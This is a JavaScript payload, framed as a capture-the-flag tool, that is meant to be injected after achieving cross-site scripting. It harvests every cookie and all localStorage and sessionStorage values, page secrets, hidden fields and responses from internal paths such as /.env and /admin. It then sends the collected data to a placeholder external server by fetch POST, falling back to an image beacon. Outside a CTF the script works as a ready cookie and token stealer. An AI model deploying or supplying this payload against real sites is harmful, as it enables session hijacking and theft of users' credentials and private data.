// CTF Flag Extraction Payload
// Use this script to systematically search for flags after achieving XSS

(function() {
    const results = [];
    
    // Function to log findings
    function logFind(location, content) {
        results.push({location, content});
        console.log(`[FLAG HUNTER] Found in ${location}:`, content);
    }
    
    // 1. Search DOM for flag patterns
    function searchDOM() {
        const flagPatterns = [
            /flag\{[^}]+\}/gi,
            /CTF\{[^}]+\}/gi,
            /FLAG\{[^}]+\}/gi,
            /[a-zA-Z0-9]{20,}/g, // Long alphanumeric strings
            /[0-9a-f]{32}/gi,    // MD5-like hashes
            /[0-9a-f]{40}/gi,    // SHA1-like hashes
        ];
        
        const bodyText = document.body.innerText || document.body.textContent || '';
        const htmlSource = document.documentElement.outerHTML;
        
        flagPatterns.forEach((pattern, i) => {
            const matches = bodyText.match(pattern);
            if (matches) {
                logFind(`DOM Text (Pattern ${i+1})`, matches);
            }
            
            const htmlMatches = htmlSource.match(pattern);
            if (htmlMatches) {
                logFind(`HTML Source (Pattern ${i+1})`, htmlMatches);
            }
        });
    }
    
    // 2. Check localStorage and sessionStorage
    function checkStorage() {
        try {
            // localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                logFind(`localStorage[${key}]`, value);
            }
            
            // sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                logFind(`sessionStorage[${key}]`, value);
            }
        } catch (e) {
            console.log('[FLAG HUNTER] Storage access failed:', e.message);
        }
    }
    
    // 3. Check cookies
    function checkCookies() {
        if (document.cookie) {
            const cookies = document.cookie.split(';');
            cookies.forEach(cookie => {
                logFind('Cookie', cookie.trim());
            });
        }
    }
    
    // 4. Check global JavaScript variables
    function checkGlobalVars() {
        const globalVars = Object.keys(window);
        globalVars.forEach(varName => {
            try {
                const value = window[varName];
                if (typeof value === 'string' && value.length > 10) {
                    if (value.includes('flag') || value.includes('FLAG') || value.includes('CTF')) {
                        logFind(`Global var: ${varName}`, value);
                    }
                }
            } catch (e) {
                // Skip variables that can't be accessed
            }
        });
    }
    
    // 5. Search for hidden elements
    function checkHiddenElements() {
        const hiddenElements = document.querySelectorAll('[style*="display:none"], [style*="visibility:hidden"], [hidden]');
        hiddenElements.forEach((el, i) => {
            if (el.innerText || el.textContent) {
                logFind(`Hidden element ${i}`, el.innerText || el.textContent);
            }
            if (el.value) {
                logFind(`Hidden input ${i}`, el.value);
            }
        });
    }
    
    // 6. Check for data attributes
    function checkDataAttributes() {
        const elements = document.querySelectorAll('[data-*]');
        elements.forEach((el, i) => {
            Array.from(el.attributes).forEach(attr => {
                if (attr.name.startsWith('data-')) {
                    logFind(`Data attribute ${attr.name} on element ${i}`, attr.value);
                }
            });
        });
    }
    
    // 7. Try to access admin/internal endpoints
    function tryInternalEndpoints() {
        const endpoints = [
            '/flag',
            '/flag.txt',
            '/admin',
            '/admin/flag',
            '/secret',
            '/hidden',
            '/api/flag',
            '/config',
            '/debug',
            '/.env',
            '/robots.txt'
        ];
        
        endpoints.forEach(endpoint => {
            fetch(endpoint)
                .then(response => response.text())
                .then(data => {
                    if (data && data.length > 0) {
                        logFind(`Endpoint ${endpoint}`, data);
                    }
                })
                .catch(e => {
                    // Endpoint doesn't exist or access denied
                });
        });
    }
    
    // 8. Check comments in HTML
    function checkComments() {
        const walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_COMMENT,
            null,
            false
        );
        
        let comment;
        while (comment = walker.nextNode()) {
            if (comment.nodeValue.trim()) {
                logFind('HTML Comment', comment.nodeValue.trim());
            }
        }
    }
    
    // 9. Send results to external server (replace with your server)
    function exfiltrateData() {
        // Replace with your server URL
        const exfilURL = 'https://your-server.com/collect';
        
        const payload = {
            url: window.location.href,
            findings: results,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };
        
        // Try multiple exfiltration methods
        
        // Method 1: Fetch (modern browsers)
        fetch(exfilURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        }).catch(() => {
            // Method 2: Image tag (works in older browsers)
            const img = new Image();
            img.src = exfilURL + '?data=' + encodeURIComponent(JSON.stringify(payload));
        });
        
        // Method 3: Log to console for manual inspection
        console.log('[FLAG HUNTER] Complete Results:', payload);
    }
    
    // Run all checks
    console.log('[FLAG HUNTER] Starting flag extraction...');
    
    searchDOM();
    checkStorage();
    checkCookies();
    checkGlobalVars();
    checkHiddenElements();
    checkDataAttributes();
    checkComments();
    tryInternalEndpoints();
    
    // Wait a bit for async requests to complete
    setTimeout(() => {
        exfiltrateData();
        
        // Also try to display results on page
        const resultDiv = document.createElement('div');
        resultDiv.innerHTML = `
            <div style="position:fixed;top:10px;right:10px;background:black;color:lime;padding:10px;z-index:9999;max-width:400px;max-height:400px;overflow:auto;font-family:monospace;font-size:12px;">
                <h3>FLAG HUNTER RESULTS:</h3>
                ${results.map(r => `<div><strong>${r.location}:</strong> ${r.content}</div>`).join('<br>')}
            </div>
        `;
        document.body.appendChild(resultDiv);
    }, 2000);
    
})();
